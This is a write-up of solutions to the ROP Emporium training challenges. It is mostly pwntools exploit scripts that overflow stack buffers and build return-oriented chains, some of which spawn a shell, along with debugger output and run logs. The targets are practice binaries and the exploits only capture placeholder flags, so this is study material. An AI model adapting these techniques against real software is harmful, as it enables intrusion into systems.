# Rop Emporium

## Handy crap!
GDB stdin: `run < <(python -c 'print("\xef\xbe\xad\xde")')`\
Stdin: `python -c 'print("\xef\xbe\xad\xde")' | ./program`\
GDB args: `set args ...`\
Console: `./program \`python -c 'print("\xef\xbe\xad\xde")'\`\

## Tools
Rabin2\
R2 - izz\
Gdb - info functions\
objdump\
NM\

ROPGadget

## Docs
R2 - https://github.com/radare/radare2/blob/master/doc/intro.md

## 0) Ret2win

### GDB function
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400811  ret2win
0x0000000000400840  __libc_csu_init
0x00000000004008b0  __libc_csu_fini
0x00000000004008b4  _fini
gdb-peda$ 
```
### NM
```
[root:~/Downloads/RopEmporium]# nm ret2win|grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400811 t ret2win
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
# context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("ret2win")

# Variables
pwnme_symbol = p64(elf.symbols["ret2win"])

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += pwnme_symbol

io = elf.process()
# gdb.attach(io)
# https://c9x.me/x86/
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-ret2win-x64.py
[*] '/root/Downloads/RopEmporium/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/ret2win': pid 5018
[+] Receiving all data: Done (322B)
[*] Process '/root/Downloads/RopEmporium/ret2win' stopped with exit code -11 (SIGSEGV) (pid 5018)
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

## 1) Split

### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I split
arch     x86
baddr    0x400000
binsz    7137
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
### GDB functions
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  __libc_csu_init
0x0000000000400890  __libc_csu_fini
0x0000000000400894  _fini
```
### NM
```
[root:~/Downloads/RopEmporium]# nm split | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### Analysis
A function exists called usefulFunction, but the string moved into edi is '/bin/ls'
```
gdb-peda$ pdis *usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400807 <+0>:     push   rbp
   0x0000000000400808 <+1>:     mov    rbp,rsp
   0x000000000040080b <+4>:     mov    edi,0x4008ff
   0x0000000000400810 <+9>:     call   0x4005e0 <system@plt>
   0x0000000000400815 <+14>:    nop
   0x0000000000400816 <+15>:    pop    rbp
   0x0000000000400817 <+16>:    ret    
End of assembler dump.
gdb-peda$ x/s 0x4008ff
0x4008ff:       "/bin/ls"
gdb-peda$ 
```
### R2 izz
```
036 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt    
```
### GDB string
```
0x601060 <usefulString>:        "/bin/cat flag.txt"                                                
0x601072 <usefulString+18>:     ""
0x601073 <usefulString+19>:     ""
0x601074 <usefulString+20>:     ""         
0x601075 <usefulString+21>:     ""
0x601076 <usefulString+22>:     ""
0x601077 <usefulString+23>:     ""
0x601078 <usefulString+24>:     ""
0x601079 <usefulString+25>:     ""                             
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("split")

# Variables
usefulFunction = p64(0x400810)
usefulString = p64(elf.symbols["usefulString"])
poprdi = p64(0x0000000000400883)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += poprdi
payload += usefulString
payload += usefulFunction

io = elf.process()
gdb.attach(io)
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-split-x64.py
[*] '/root/Downloads/RopEmporium/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/split': pid 17865
[+] Receiving all data: Done (109B)
[*] Stopped process '/root/Downloads/RopEmporium/split' (pid 17865)
split by ROP Emporium
64bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
```

## 2) CallMe

### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I callme    
arch     x86
baddr    0x400000
binsz    11375
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```
### GDB Functions
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x00000000004017c0  _init
0x00000000004017f0  puts@plt
0x0000000000401800  printf@plt
0x0000000000401810  callme_three@plt
0x0000000000401820  memset@plt
0x0000000000401830  __libc_start_main@plt
0x0000000000401840  fgets@plt
0x0000000000401850  callme_one@plt
0x0000000000401860  setvbuf@plt
0x0000000000401870  callme_two@plt
0x0000000000401880  exit@plt
0x0000000000401890  __gmon_start__@plt
0x00000000004018a0  _start
0x00000000004018d0  deregister_tm_clones
0x0000000000401910  register_tm_clones
0x0000000000401950  __do_global_dtors_aux
0x0000000000401970  frame_dummy
0x0000000000401996  main
0x0000000000401a05  pwnme
0x0000000000401a57  usefulFunction
0x0000000000401ab0  usefulGadgets
0x0000000000401ac0  __libc_csu_init
0x0000000000401b30  __libc_csu_fini
0x0000000000401b34  _fini
pwndbg> 
```
### Exploit
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("callme")

# Variables
callme_one = p64(elf.symbols["callme_one"])
callme_two = p64(elf.symbols["callme_two"])
callme_three = p64(elf.symbols["callme_three"])
# Pop, pop, pop ret - pops all our arguments onto the stacl
popreg = p64(0x0000000000401ab0)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_one
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_two
payload += popreg
payload += p64(0x1)
payload += p64(0x2)
payload += p64(0x3)
payload += callme_three

io = elf.process()
#gdb.attach(io)
# b *pwnme+79
io.sendline(payload)
data = io.recvall()
print(data)
```
### Results
```
[root:~/Downloads/RopEmporium]# python exploit-callme-x64.py
[*] '/root/Downloads/RopEmporium/callme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[+] Starting local process '/root/Downloads/RopEmporium/callme': pid 28268
[+] Receiving all data: Done (99B)
[*] Process '/root/Downloads/RopEmporium/callme' stopped with exit code 0 (pid 28268)
callme by ROP Emporium
64bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```

## 3) Write4

### GDB functions
```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  usefulGadgets
0x0000000000400830  __libc_csu_init
0x00000000004008a0  __libc_csu_fini
0x00000000004008a4  _fini
pwndbg> 

```
### NM
```
[root:~/Downloads/RopEmporium]# nm ./write4 | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -I write4
arch     x86
baddr    0x400000
binsz    7150
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
```
### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("write4")

# Variables
system = p64(elf.symbols["system"])
# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
movGadget = p64(0x400820)
# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
popGadget = p64(0x400890)
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x601050)
# String to execute with the system function
stringToWrite = "/bin/sh\x00"
# Gadget: 0x0000000000400893 : pop rdi ; ret
poprdi = p64(0x0000000000400893)

# Pack the arguments for the functions we want to call
payload = "a" * 40
payload += popGadget
payload += writeWhatWhere
payload += stringToWrite
payload += movGadget
payload += poprdi
payload += p64(0x601050)

payload += system


io = elf.process()
#gdb.attach(io)
io.sendline(payload)
#data = io.recvall()
#print(data)
#
io.interactive()
```
### Exploit (/bin/cat flag.txt)
```
# Import the library
from pwn import *

# Debugging
# context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("write4")

# Variables
system = p64(elf.symbols["system"])
# Gagdet: 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
movGadget = p64(0x0000000000400820)
# Gadget: 0x0000000000400890 : pop r14 ; pop r15 ; ret
popGadget = p64(0x0000000000400890)
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x0000000000601050)
# Gadget: 0x0000000000400893 : pop rdi ; ret
poprdi = p64(0x0000000000400893)

# Pack the arguments for the functions we want to call
payload = "a" * 40

# Write the first 8 bytes
payload += popGadget
payload += p64(0x601050)
payload += "/bin/cat"

# Move the first 8 bytes to the address 0x601050
payload += movGadget

# Write the second 8 bytes
payload += popGadget
payload += p64(0x601058)
payload += " flag.tx"

# Move the second 8 bytes to the address 0x601058
payload += movGadget

# Write the second 8 bytes
payload += popGadget
payload += p64(0x601060)
payload += "t\x00\x00\x00\x00\x00\x00\x00"

# Move the third 8 bytes to the address 0x601060
payload += movGadget

# Pop the address where the string is into RDI
payload += poprdi
payload += p64(0x601050)

# Fire system()
payload += system

io = elf.process()
# gdb.attach(io)
io.sendline(payload)
data = io.recvall()
print(data)
```
### Result
```
[root:~/Downloads/RopEmporium]# python exploit-write4-x64.py
[*] '/root/Downloads/RopEmporium/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/write4': pid 46943
[+] Receiving all data: Done (107B)
[*] Process '/root/Downloads/RopEmporium/write4' stopped with exit code -11 (SIGSEGV) (pid 46943)
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
> ROPE{a_placeholder_32byte_flag!}
```

## Badchars

### NM
```
[root:~/Downloads/RopEmporium]# nm badchars | grep ' t ' 
0000000000400a40 t checkBadchars
00000000004007c0 t deregister_tm_clones
0000000000400840 t __do_global_dtors_aux
0000000000400860 t frame_dummy
00000000004009f0 t nstrlen
00000000004008f5 t pwnme
0000000000400800 t register_tm_clones
00000000004009df t usefulFunction
```
### GDB info functions
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000400698  _init
0x00000000004006d0  free@plt
0x00000000004006e0  puts@plt
0x00000000004006f0  system@plt
0x0000000000400700  printf@plt
0x0000000000400710  memset@plt
0x0000000000400720  __libc_start_main@plt
0x0000000000400730  fgets@plt
0x0000000000400740  memcpy@plt
0x0000000000400750  malloc@plt
0x0000000000400760  setvbuf@plt
0x0000000000400770  exit@plt
0x0000000000400780  __gmon_start__@plt
0x0000000000400790  _start
0x00000000004007c0  deregister_tm_clones
0x0000000000400800  register_tm_clones
0x0000000000400840  __do_global_dtors_aux
0x0000000000400860  frame_dummy
0x0000000000400886  main
0x00000000004008f5  pwnme
0x00000000004009df  usefulFunction
0x00000000004009f0  nstrlen
0x0000000000400a40  checkBadchars
0x0000000000400b30  usefulGadgets
0x0000000000400b50  __libc_csu_init
0x0000000000400bc0  __libc_csu_fini
0x0000000000400bc4  _fini
```
### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
#context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("badchars")

# Bad chars:
# badchars are: b i c / <space> f n s
badchars = 'bic/ fns'
badchar_hex = [hex(ord(x)) for x in badchars]
# Xord result: ['l', '!', '*', '-', 'l', '0', '+']
xord_string = [chr(ord(x) ^ 0x43) for x in '/bin/sh']
# Reverse result: '/bin/sh'
backtostring = ''.join([chr(ord(x) ^ 0x43) for x in xord_string])

# Variables
# Section to write data, readelf -a ./write4;readelf -x .data ./write4
writeWhatWhere = p64(0x00000000006010d0)

# String to execute with the system function
stringToWrite = "l!*-l0+\x00"

# Pop gadget: 0x0000000000400b3b : pop r12 ; pop r13 ; ret
popGadget = p64(0x0000000000400b3b)

# mov gadget: 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
movGadget = p64(0x0000000000400b34)

# Xor: 0x400b30 <usefulGadgets>       xor    byte ptr [r15], r14b; ret
xor = p64(0x400b30)

# 0x400b40 <usefulGadgets+16>    pop    r14; pop     r15;    ret
xorpop = p64(0x400b40)

# Poprdi gadget: 0x0000000000400b39 : pop rdi ; ret
poprdiGadget = p64(0x0000000000400b39)

# System function:
system = p64(elf.symbols["system"])


# Generate our payload
#
payload = "a" * 40

# Push our Xor'd payload onto the stack
payload += popGadget
payload += stringToWrite  # r12
payload += writeWhatWhere # r13

# Move it to our memory address
payload += movGadget

# Xor the first char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += writeWhatWhere # r15 the destination address
payload += xor

# Xor the second char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d1) # r15 the destination address
payload += xor

# Xor the third char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d2) # r15 the destination address
payload += xor

# Xor the fourth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d3) # r15 the destination address
payload += xor

# Xor the fifth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d4) # r15 the destination address
payload += xor

# Xor the sixth char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d5) # r15 the destination address
payload += xor

# Xor the seventh char
payload += xorpop
payload += p64(0x43) # r14b Our XOR key
payload += p64(0x00000000006010d6) # r15 the destination address
payload += xor

# Pop RDI Gadget and the memory address into registers
payload += poprdiGadget
payload += writeWhatWhere
# Call system with our pointers in the correct registers.
payload += system

io = elf.process()
#gdb.attach(io)
io.sendline(payload)
io.interactive()
```
### Result (launch /bin/sh)
```
[root:~/Downloads/RopEmporium]# python exploit-badchars-x64-binsh.py 
[*] '/root/Downloads/RopEmporium/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/badchars': pid 17851
[*] Switching to interactive mode
badchars by ROP Emporium
64bits

badchars are: b i c / <space> f n s
> $ cat flag.txt
ROPE{a_placeholder_32byte_flag!}
$  
```

## Fluff

### NM
```
[root:~/Downloads/RopEmporium]# nm ./fluff | grep ' t '
0000000000400680 t deregister_tm_clones
0000000000400700 t __do_global_dtors_aux
0000000000400720 t frame_dummy
00000000004007b5 t pwnme
00000000004006c0 t register_tm_clones
0000000000400807 t usefulFunction
```
### GDB info functions
```
gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004005a0  _init
0x00000000004005d0  puts@plt
0x00000000004005e0  system@plt
0x00000000004005f0  printf@plt
0x0000000000400600  memset@plt
0x0000000000400610  __libc_start_main@plt
0x0000000000400620  fgets@plt
0x0000000000400630  setvbuf@plt
0x0000000000400640  __gmon_start__@plt
0x0000000000400650  _start
0x0000000000400680  deregister_tm_clones
0x00000000004006c0  register_tm_clones
0x0000000000400700  __do_global_dtors_aux
0x0000000000400720  frame_dummy
0x0000000000400746  main
0x00000000004007b5  pwnme
0x0000000000400807  usefulFunction
0x0000000000400820  questionableGadgets
0x0000000000400860  __libc_csu_init
0x00000000004008d0  __libc_csu_fini
0x00000000004008d4  _fini
```
### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("fluff")

# Gadgets
#
# Pop address into r12: 0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
popR12Gadget = p64(0x0000000000400832)
# Zero out r11: 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
xorR11Gadget = p64(0x0000000000400822)
# Xor Gadget: 0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xorR11R12Gadget = p64(0x000000000040082f)
# XChg Gadget: 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xchg_gadget = p64(0x0000000000400840)
# Gadget: mov 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
movGadget = p64(0x000000000040084e)

# WriteWhatWhere
writeWhatWhere = p64(0x601500)
# String to execute with the system function
stringToWrite = "/bin/sh\x00"

# poprdi: 0x00000000004008c3: pop rdi; ret;
poprdi = p64(0x00000000004008c3)
# Address of system
system = p64(0x0000000000400810)

# Generate our payload
#
# Overflow the fgets buffer
payload = "a" * 40
# Put the address of where we want our payload to be
payload += popR12Gadget
payload += writeWhatWhere
payload += xorR11Gadget
payload += p64(0x41)
payload += xorR11R12Gadget
payload += p64(0x41)
payload += xchg_gadget
payload += p64(0x41)

# Put our string into R11
payload += popR12Gadget
payload += stringToWrite
payload += xorR11Gadget
payload += p64(0x41)
payload += xorR11R12Gadget
payload += p64(0x41)

# Move payload string from r11 to the address in R10
payload += movGadget
payload += p64(0x00)
payload += p64(0x00)

# Call system with our address in rdi
payload += poprdi
payload += writeWhatWhere
payload += system

# GTG!
io = elf.process()
# gdb.attach(io)
io.sendline(payload)
io.interactive()
```
### Result (launch /bin/sh)
```
[root:~/Downloads/RopEmporium]# python exploit-fluff-x64.py
[*] '/root/Downloads/RopEmporium/fluff'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/Downloads/RopEmporium/fluff': pid 38717
[*] Switching to interactive mode
fluff by ROP Emporium
64bits

You know changing these strings means I have to rewrite my solutions...
> $ whoami
root
```

## Pivot

### nm -i ....
```
[root:~/Downloads/RopEmporium]# rabin2 -I pivot   
arch     x86
baddr    0x400000
binsz    11395
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    ./
static   false
stripped false
subsys   linux
va       true
```

### NM
```
[root:~/Downloads/RopEmporium]# nm  ./pivot | grep ' t '
00000000004008d0 t deregister_tm_clones
0000000000400950 t __do_global_dtors_aux
0000000000400970 t frame_dummy
0000000000400a3b t pwnme
0000000000400910 t register_tm_clones
0000000000400ae2 t uselessFunction
```
### Rabin2
```
[root:~/Downloads/RopEmporium]# rabin2 -i pivot
[Imports]
Num  Vaddr       Bind      Type Name
   1 0x004007f0  GLOBAL    FUNC free
   2 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
   3 0x00400800  GLOBAL    FUNC puts
   4 0x00400810  GLOBAL    FUNC printf
   5 0x00400820  GLOBAL    FUNC memset
   6 0x00400830  GLOBAL    FUNC __libc_start_main
   7 0x00400840  GLOBAL    FUNC fgets
   8 0x00000000    WEAK  NOTYPE __gmon_start__
   9 0x00400850  GLOBAL    FUNC foothold_function
  10 0x00400860  GLOBAL    FUNC malloc
  11 0x00400870  GLOBAL    FUNC setvbuf
  12 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  13 0x00400880  GLOBAL    FUNC exit
  14 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable
   2 0x00000000    WEAK  NOTYPE _ITM_deregisterTMCloneTable
   8 0x00000000    WEAK  NOTYPE __gmon_start__
  12 0x00000000    WEAK  NOTYPE _Jv_RegisterClasses
  14 0x00000000    WEAK  NOTYPE _ITM_registerTMCloneTable
```
### GDB info functions
```
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x00000000004007b8  _init
0x00000000004007f0  free@plt
0x0000000000400800  puts@plt
0x0000000000400810  printf@plt
0x0000000000400820  memset@plt
0x0000000000400830  __libc_start_main@plt
0x0000000000400840  fgets@plt
0x0000000000400850  foothold_function@plt
0x0000000000400860  malloc@plt
0x0000000000400870  setvbuf@plt
0x0000000000400880  exit@plt
0x0000000000400890  __gmon_start__@plt
0x00000000004008a0  _start
0x00000000004008d0  deregister_tm_clones
0x0000000000400910  register_tm_clones
0x0000000000400950  __do_global_dtors_aux
0x0000000000400970  frame_dummy
0x0000000000400996  main
0x0000000000400a3b  pwnme
0x0000000000400ae2  uselessFunction
0x0000000000400b00  usefulGadgets
0x0000000000400b10  __libc_csu_init
0x0000000000400b80  __libc_csu_fini
0x0000000000400b84  _fini
```

### Function offset: foothold_function - ret2win
```
[root:~/Downloads/RopEmporium]# r2 -AAA ./libpivot.so 
[Invalid instruction of 16331 bytes at 0x7cd entry0 (aa)
Invalid instruction of 16330 bytes at 0x38
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
[0x00000870]> afl
0x00000000    3 124  -> 109  sym.imp.__cxa_finalize
0x000007f8    3 26           sym._init
0x00000830    1 6            sym.imp.system
0x00000840    1 6            sym.imp.printf
0x00000850    1 6            sym.imp.exit
0x00000860    1 6            sub.__gmon_start_860
0x00000868    1 6            sub.__cxa_finalize_868
0x00000870    4 50   -> 44   entry0
0x000008b0    4 66   -> 57   sym.register_tm_clones
0x00000900    5 50           sym.__do_global_dtors_aux
0x00000940    4 48   -> 42   entry.init0
0x00000970    1 24           sym.foothold_function
0x00000988    1 31           sym.void_function_01
0x000009a7    1 31           sym.void_function_02
0x000009c6    1 31           sym.void_function_03
0x000009e5    1 31           sym.void_function_04
0x00000a04    1 31           sym.void_function_05
0x00000a23    1 31           sym.void_function_06
0x00000a42    1 31           sym.void_function_07
0x00000a61    1 31           sym.void_function_08
0x00000a80    1 31           sym.void_function_09
0x00000a9f    1 31           sym.void_function_10
0x00000abe    1 26           sym.ret2win
0x00000ad8    1 9            sym._fini
```
```
>>> hex(0x00000abe - 0x00000970)
'0x14e'
```

### Exploit (launch /bin/sh)
```
# Import the library
from pwn import *

# Debugging
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-v']

# Binary has NX set - no typical BOF - 
# Help info: http://docs.pwntools.com/en/stable/intro.html

elf = ELF("pivot")

# Gadgets
#
# Foothold plt and got
foothold_plt = p64(0x00400850)
foothold_got = p64(0x00602048)                # r2 -AAA ./libpivot.so; ir to show relocation got info.
# Offset from foothold -> ret2win
offset = p64(0x14e)
# 0x0000000000400b00: pop rax; ret; 
popRaxGadget = p64(0x0000000000400b00)
# 0x0000000000400b02: xchg rax, rsp; ret;
xchgGadget = p64(0x0000000000400b02)
# Add rax 0x0000000000400b09: add rax, rbp; ret;
addRaxGadget = p64(0x0000000000400b09)
# 0x0000000000400b05: mov rax, qword ptr [rax]; ret;
derefRaxGadget = p64(0x0000000000400b05)
# 0x000000000040098e: call rax;
jmpRaxGadget = p64(0x000000000040098e)
# 0x0000000000400900: pop rbp; ret;
popRbpGagdet = p64(0x0000000000400900)

# The heap? Need to find the address of ret2win and call it.
second_chain = foothold_plt
second_chain += popRaxGadget
second_chain += foothold_got
second_chain += derefRaxGadget
second_chain += popRbpGagdet
second_chain += offset
second_chain += addRaxGadget
second_chain += jmpRaxGadget

# GTG!
io = elf.process()
gdb.attach(io,"""
b *pwnme+164
continue
""")
io.sendline(second_chain)
heap_address = p64(int(io.recvline_contains('The Old Gods kindly bestow upon you a place to pivot:').decode('UTF-8').split(' ')[-1].encode('ascii','ignore'),16))

# Our second fgets overflow
stack_smash = "a" * 40              # Stack smashing buffer
stack_smash += popRaxGadget
stack_smash += heap_address
stack_smash += xchgGadget
# 3 qwords space on the stack after our buffer

io.sendline(stack_smash)
io.interactive()
```
### Result
```
[*] running in new terminal: /usr/bin/gdb -q  "/root/Downloads/RopEmporium/pivot" 12091 -x "/tmp/pwnVXsg_z.gdb"
[DEBUG] Launching a new terminal: ['/usr/bin/tmux', 'splitw', '-v', '/usr/bin/gdb -q  "/root/Downloads/RopEmporium/pivot" 12091 -x "/tmp/pwnVXsg_z.gdb"']
[+] Waiting for debugger: Done
[DEBUG] Sent 0x41 bytes:
    00000000  50 08 40 00  00 00 00 00  00 0b 40 00  00 00 00 00  │P·@·│····│··@·│····│
    00000010  48 20 60 00  00 00 00 00  05 0b 40 00  00 00 00 00  │H `·│····│··@·│····│
    00000020  00 09 40 00  00 00 00 00  4e 01 00 00  00 00 00 00  │··@·│····│N···│····│
    00000030  09 0b 40 00  00 00 00 00  8e 09 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0xb7 bytes:
    'pivot by ROP Emporium\n'
    '64bits\n'
    '\n'
    'Call ret2win() from libpivot.so\n'
    'The Old Gods kindly bestow upon you a place to pivot: 0x7f2e32ec5f10\n'
    'Send your second chain now and it will land there\n'
    '> '
[DEBUG] Sent 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  00 0b 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000030  10 5f ec 32  2e 7f 00 00  02 0b 40 00  00 00 00 00  │·_·2│.···│··@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode
Send your second chain now and it will land there
> [DEBUG] Received 0x23 bytes:
    'Now kindly send your stack smash\n'
    '> '
Now kindly send your stack smash
> [DEBUG] Received 0x54 bytes:
    'foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so'
foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so[DEBUG] Received 0x21 bytes:
    'ROPE{a_placeholder_32byte_flag!}\n'
ROPE{a_placeholder_32byte_flag!}
